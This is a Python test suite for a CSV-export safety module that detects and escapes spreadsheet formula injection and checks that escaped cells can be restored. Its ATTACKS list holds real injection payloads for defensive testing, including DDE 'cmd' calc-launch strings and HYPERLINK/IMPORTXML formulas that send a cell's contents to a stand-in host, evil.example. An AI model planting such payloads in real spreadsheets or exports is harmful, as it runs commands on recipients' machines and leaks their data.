"""Formula injection: a neutralised cell must be inert in a spreadsheet and recoverable in code.

Two properties carry the module. The security property is that no cell in the produced CSV starts
with a character a spreadsheet evaluates. The correctness property is that
``restore_cell(neutralize_cell(x)) == x`` for every string - asserted here on a fixed corpus and,
via Hypothesis, on arbitrary text.
"""

from __future__ import annotations

import csv
import io
from decimal import Decimal

import pytest
from hypothesis import given
from hypothesis import strategies as st

from app.security.export_safety import (
    ESCAPE,
    FORMULA_PREFIXES,
    is_formula,
    neutralize_cell,
    neutralize_row,
    restore_cell,
    restore_row,
    scan_rows,
    to_safe_csv,
)

# Payloads that have actually been used against spreadsheet importers.
ATTACKS = [
    "=1+1",
    "=cmd|'/c calc'!A0",
    '=HYPERLINK("http://evil.example/?d="&A1,"Click")',
    "@SUM(1+9)*cmd|'/c calc'!A0",
    "+1+1",
    "-2+3+cmd|'/c calc'!A0",
    '=IMPORTXML(CONCAT("http://evil.example/?",A1),"//a")',
    "\t=1+1",
    "\r=1+1",
    " =1+1",
    "﻿=1+1",
]

# Values that must survive untouched, because escaping them would break real result sets.
BENIGN = [
    "hello",
    "-42",
    "+3.5",
    "-1.25e-3",
    "0",
    ".5",
    "customer@example.com",
    "O'Brien",
    "2026-08-24",
    "a=b",
    "",
]


# ---------------------------------------------------------------------------------------------
# Detection
# ---------------------------------------------------------------------------------------------


@pytest.mark.parametrize("payload", ATTACKS)
def test_known_payloads_are_detected(payload):
    assert is_formula(payload)


@pytest.mark.parametrize("value", BENIGN)
def test_benign_values_are_not_detected(value):
    assert not is_formula(value)


@pytest.mark.parametrize("prefix", FORMULA_PREFIXES)
def test_every_declared_prefix_triggers_on_a_non_numeric_value(prefix):
    assert is_formula(f"{prefix}payload")


def test_signed_numbers_are_the_documented_exception():
    # This is the false-positive guard: escaping every negative number would turn numeric columns
    # into text and is how a control like this gets switched off in production.
    assert not is_formula("-1234.56")
    assert is_formula("-1+1")
    assert is_formula("-1,234")  # ambiguous separator handling, so treated as text


# ---------------------------------------------------------------------------------------------
# Neutralisation
# ---------------------------------------------------------------------------------------------


@pytest.mark.parametrize("payload", ATTACKS)
def test_a_neutralised_payload_no_longer_starts_with_a_trigger(payload):
    neutralized = neutralize_cell(payload)
    assert neutralized.startswith(ESCAPE)
    assert neutralized[0] not in FORMULA_PREFIXES


@pytest.mark.parametrize("payload", ATTACKS)
def test_neutralisation_keeps_the_value_visible_rather_than_deleting_it(payload):
    assert payload in neutralize_cell(payload)


@pytest.mark.parametrize("value", BENIGN)
def test_benign_values_pass_through_byte_identical(value):
    assert neutralize_cell(value) == value


@pytest.mark.parametrize("value", [42, -42, 3.5, Decimal("-1.5"), None, True])
def test_non_string_cells_are_returned_unchanged(value):
    assert neutralize_cell(value) is value


def test_an_existing_leading_apostrophe_is_escaped_so_the_inverse_stays_unambiguous():
    assert neutralize_cell("'=1+1") == "''=1+1"
    # A plain apostrophe-led word is not something neutralize would have produced, so it is left be.
    assert neutralize_cell("'tis") == "'tis"


# ---------------------------------------------------------------------------------------------
# Round-tripping
# ---------------------------------------------------------------------------------------------


@pytest.mark.parametrize("value", ATTACKS + BENIGN + ["'=1+1", "'tis", "''", "'"])
def test_restore_inverts_neutralize_on_the_corpus(value):
    assert restore_cell(neutralize_cell(value)) == value


@given(st.text())
def test_restore_inverts_neutralize_for_arbitrary_text(value):
    assert restore_cell(neutralize_cell(value)) == value


@given(st.text())
def test_a_neutralised_value_never_leads_with_a_trigger(value):
    neutralized = neutralize_cell(value)
    assert not neutralized or not is_formula(neutralized)


def test_rows_round_trip():
    row = ["=1+1", "safe", -42, "'quoted"]
    assert restore_row(neutralize_row(row)) == row


# ---------------------------------------------------------------------------------------------
# CSV serialisation
# ---------------------------------------------------------------------------------------------


def test_to_safe_csv_neutralises_cells_and_reports_how_many():
    result = to_safe_csv(["name", "note"], [["Ann", "=1+1"], ["Bob", "fine"]])
    assert result.cells_neutralized == 1
    assert result.headers_neutralized == 0
    assert result.changed
    assert "'=1+1" in result.text


def test_column_names_are_neutralised_too():
    # A column can be named `=HYPERLINK(...)` in PostgreSQL, and the header row is parsed first.
    result = to_safe_csv(['=HYPERLINK("http://evil.example")'], [["x"]])
    assert result.headers_neutralized == 1
    assert result.text.startswith(f'"{ESCAPE}=HYPERLINK')


def test_a_clean_result_set_reports_no_changes():
    result = to_safe_csv(["id", "amount"], [[1, -42], [2, 7]])
    assert not result.changed
    assert result.text == "id,amount\n1,-42\n2,7\n"


def test_the_csv_parses_back_and_restores_to_the_original_rows():
    columns = ["name", "formula", "amount"]
    rows = [["Ann", "=1+1", "-42"], ["O'Brien", "@SUM(1)", "0"]]
    result = to_safe_csv(columns, rows)

    parsed = list(csv.reader(io.StringIO(result.text)))
    assert restore_row(parsed[0]) == columns
    assert [restore_row(r) for r in parsed[1:]] == rows


def test_no_parsed_cell_in_an_attacked_export_would_be_evaluated():
    rows = [[payload] for payload in ATTACKS]
    text = to_safe_csv(["payload"], rows).text
    for parsed_row in csv.reader(io.StringIO(text)):
        for cell in parsed_row:
            assert not is_formula(cell)


def test_scan_rows_counts_without_producing_an_export():
    assert scan_rows([["=1+1", "ok"], ["-42", "@x"]]) == 2
